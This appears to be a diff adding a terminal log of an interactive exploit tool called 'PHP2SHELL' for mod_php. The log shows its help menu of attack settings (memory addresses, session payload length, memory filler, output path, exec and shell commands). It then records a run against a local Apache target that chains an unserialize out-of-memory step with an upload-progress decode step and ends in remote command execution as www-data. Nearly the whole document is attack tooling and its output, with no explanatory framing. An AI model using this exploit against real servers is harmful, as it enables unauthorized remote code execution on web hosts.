@@ -1,0 +1,24 @@
+PHP2SHELL mod_php interactive exploit
+target http://127.0.0.1:18130  D=0x7fdb5ca6c000  system=0x7fdb5f919090
+type 'help' for commands; each exec restarts the Apache child (expected)
+php2shell(modphp)> help                      this text
+  info                      current settings
+  target <url>              set target base URL
+  set d|system|struct_off <hex>
+  set len <n>               session value length (default 65500)
+  set sid <id>              session id
+  set filler <n>            A memory filler (default 4000000)
+  set elems <n>             A outer array elements (default 40000)
+  set out <path>            target filesystem output path
+  set outurl <path>         URL path for the output file
+  exec <command>            run one command on the target
+  shell                     interactive remote shell (exec per line)
+  quit / exit               leave
+php2shell(modphp)> [*] remote shell mode; empty line or 'back' returns
+php2shell(target)> [*] store ... 200 STORED pid=419 len=65500
+
+[*] A (unserialize OOM) ... 500
+[*] B (upload-progress decode) ... connection dropped (expected)
+[*] output:
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+php2shell(target)> php2shell(modphp)> 
